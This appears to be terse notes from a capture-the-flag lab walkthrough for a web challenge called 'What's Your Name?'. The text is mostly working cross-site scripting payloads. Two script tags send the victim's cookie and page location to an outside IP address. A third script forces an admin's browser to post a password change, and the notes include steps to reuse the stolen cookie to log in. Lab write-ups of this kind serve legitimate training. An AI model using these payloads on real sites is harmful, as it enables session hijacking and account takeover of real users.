# **What’s Your Name?**

```
<script>var i=new Image(); i.src="http://192.168.140.170?mod_cookie="+document.cookie;</script>
<script>var i=new Image(); i.src="http://192.168.140.170?mod_location="+document.location;</script>
```

When you have the cookie just put in the browser value and it logins on reload.

Go to the chat, and test XSS on the admin. It works now use this payload:

```
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "htt" + "p://login.worldwap.thm/change_password.php");
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send('new_password=hello');
</script> 
```

`password` doesn’t work!!!!
